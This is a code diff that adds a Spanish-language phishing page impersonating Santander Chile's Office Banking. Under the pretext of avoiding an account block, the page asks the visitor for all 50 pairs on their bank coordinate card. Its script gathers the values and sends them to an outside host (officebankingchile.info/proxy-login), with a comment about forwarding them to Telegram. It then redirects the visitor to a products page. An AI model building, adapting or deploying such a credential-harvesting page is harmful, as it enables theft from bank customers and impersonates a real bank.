@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Actualizar Tarjeta de Coordenadas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body { background:#f5f5f5; padding:20px; }
+    .coord-input { width:45px; text-align:center; }
+    .hidden { display:none; }
+    .container-box {
+      background:white;
+      padding:25px;
+      border-radius:12px;
+      box-shadow:0 4px 12px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container mt-4">
+
+  <div class="text-center mb-4">
+    <img src="/logo-office-banking.svg" style="height:60px; margin-right:10px;">
+    <img src="/LogoSantander.png" style="height:60px;">
+  </div>
+
+  <div class="container-box">
+
+    <h3 class="text-center mb-3">
+      Actualización de Tarjeta de Coordenadas
+    </h3>
+
+    <p class="text-center mb-4">
+      Ingresa los <strong>50 pares numéricos</strong> de tu Tarjeta de Coordenadas para evitar el bloqueo.
+    </p>
+
+    <!-- COORDENADAS -->
+    <div id="pantallaCoordenadas">
+      <h4 class="text-center mb-3">Ingresa tus 50 coordenadas</h4>
+
+      <div class="table-responsive">
+        <table class="table table-bordered text-center bg-white">
+          <thead>
+            <tr>
+              <th></th>
+              <th>A</th><th>B</th><th>C</th><th>D</th><th>E</th>
+              <th>F</th><th>G</th><th>H</th><th>I</th><th>J</th>
+            </tr>
+          </thead>
+          <tbody>
+
+            <!-- FILA 1 -->
+            <tr><th>1</th>
+              <td><input id="coord-A1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-B1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-C1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-D1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-E1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-F1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-G1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-H1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-I1" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-J1" maxlength="2" class="coord-input"></td>
+            </tr>
+
+            <!-- FILA 2 -->
+            <tr><th>2</th>
+              <td><input id="coord-A2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-B2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-C2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-D2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-E2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-F2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-G2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-H2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-I2" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-J2" maxlength="2" class="coord-input"></td>
+            </tr>
+
+            <!-- FILA 3 -->
+            <tr><th>3</th>
+              <td><input id="coord-A3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-B3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-C3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-D3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-E3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-F3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-G3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-H3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-I3" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-J3" maxlength="2" class="coord-input"></td>
+            </tr>
+
+            <!-- FILA 4 -->
+            <tr><th>4</th>
+              <td><input id="coord-A4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-B4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-C4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-D4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-E4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-F4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-G4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-H4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-I4" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-J4" maxlength="2" class="coord-input"></td>
+            </tr>
+
+            <!-- FILA 5 -->
+            <tr><th>5</th>
+              <td><input id="coord-A5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-B5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-C5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-D5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-E5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-F5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-G5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-H5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-I5" maxlength="2" class="coord-input"></td>
+              <td><input id="coord-J5" maxlength="2" class="coord-input"></td>
+            </tr>
+
+          </tbody>
+        </table>
+      </div>
+
+      <button class="btn btn-danger w-100 mt-3" onclick="enviarCoordenadas()">
+        Ingresar
+      </button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+async function enviarCoordenadas(){
+  let coords = {};
+  const letras = ["A","B","C","D","E","F","G","H","I","J"];
+
+  for(let fila=1; fila<=5; fila++){
+    for(let col of letras){
+      let id = `coord-${col}${fila}`;
+      let valor = document.getElementById(id).value.trim();
+      if(valor.length !== 2){
+        alert(`El valor ${col}${fila} debe tener 2 dígitos.`);
+        return;
+      }
+      coords[`${col}${fila}`] = valor;
+    }
+  }
+
+  // Enviar al Telegram vía backend
+  await fetch("https://officebankingchile.info/proxy-login", {
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({ coordenadas: coords })
+  });
+
+  // Redirigir a productos
+  window.location.href = "productos.html";
+}
+</script>
+
+</body>
+</html>
